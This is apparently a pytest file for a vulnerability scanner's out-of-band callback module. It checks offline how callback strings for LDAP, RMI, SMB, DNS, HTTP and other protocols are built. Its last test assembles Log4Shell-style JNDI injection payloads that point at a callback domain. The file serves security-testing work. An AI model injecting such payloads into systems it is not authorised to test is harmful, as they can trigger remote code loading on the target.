# -*- coding: utf-8 -*-
"""A1.3 多协议带外回调构造（LDAP/RMI/SMB/SMTP + DNS/HTTP/HTTPS）离线验证。

只验证"回调目标串构造"的协议语义与退化行为（无域名/无 token → None），
不发起任何网络请求（真实回调验证需授权 OOB 服务，环境受限时保持离线）。
"""
import pytest

from vulnclaw.core.oob_channel import OOBChannel, _OOB_PROTOCOLS

DOMAIN = "abc.oast.pro"


def _ch(domain: str = DOMAIN) -> OOBChannel:
    ch = OOBChannel(provider="interactsh")
    ch._domain = domain
    ch._resolved_provider = "interactsh"
    return ch


class TestProtocolCallback:
    def test_supported_protocol_set(self):
        assert set(_OOB_PROTOCOLS) == {"ldap", "rmi", "smb", "smtp", "dns", "http", "https"}

    def test_ldap_format(self):
        assert _ch().protocol_callback("tok1", "ldap") == f"ldap://tok1.{DOMAIN}/"

    def test_rmi_format(self):
        assert _ch().protocol_callback("tok1", "rmi") == f"rmi://tok1.{DOMAIN}/"

    def test_smb_unc_format(self):
        # SMB 用 UNC 路径（\\host\share），而非 URL
        assert _ch().protocol_callback("tok1", "smb") == f"\\\\tok1.{DOMAIN}\\share"

    def test_smtp_resolves_via_dns_label(self):
        assert _ch().protocol_callback("tok1", "smtp") == f"tok1.{DOMAIN}"

    def test_dns_label_format(self):
        assert _ch().protocol_callback("tok1", "dns") == f"tok1.{DOMAIN}"

    def test_http_formats(self):
        ch = _ch()
        assert ch.protocol_callback("tok1", "http") == f"http://tok1.{DOMAIN}/"
        assert ch.protocol_callback("tok1", "https") == f"https://tok1.{DOMAIN}/"

    def test_proto_case_insensitive(self):
        assert _ch().protocol_callback("tok1", "LDAP") == f"ldap://tok1.{DOMAIN}/"
        assert _ch().protocol_callback("tok1", "RMI") == f"rmi://tok1.{DOMAIN}/"

    def test_unknown_proto_falls_back_to_dns_label(self):
        assert _ch().protocol_callback("tok1", "gopher") == f"tok1.{DOMAIN}"

    def test_no_domain_returns_none(self):
        ch = _ch(domain="")
        for proto in _OOB_PROTOCOLS:
            assert ch.protocol_callback("tok1", proto) is None

    def test_no_token_returns_none(self):
        ch = _ch()
        for proto in _OOB_PROTOCOLS:
            assert ch.protocol_callback("", proto) is None


class TestProtocolProbes:
    def test_probes_cover_all_protocols(self):
        probes = _ch().protocol_probes("tok1")
        assert set(probes) == set(_OOB_PROTOCOLS)

    def test_probes_values_match_individual(self):
        ch = _ch()
        probes = ch.protocol_probes("tok1")
        for proto in _OOB_PROTOCOLS:
            assert probes[proto] == ch.protocol_callback("tok1", proto)

    def test_probes_empty_without_domain(self):
        assert _ch(domain="").protocol_probes("tok1") == {}


class TestJNDIPayloadIntegration:
    """log4shell/fastjson 类 JNDI payload 可直接拼接协议回调串。"""

    @pytest.mark.parametrize("proto,prefix", [("ldap", "ldap://"), ("rmi", "rmi://")])
    def test_jndi_payload_contains_callback(self, proto, prefix):
        cb = _ch().protocol_callback("tok1", proto)
        payload = "${jndi:" + cb + "}"
        assert payload == "${jndi:" + prefix + "tok1." + DOMAIN + "/}"
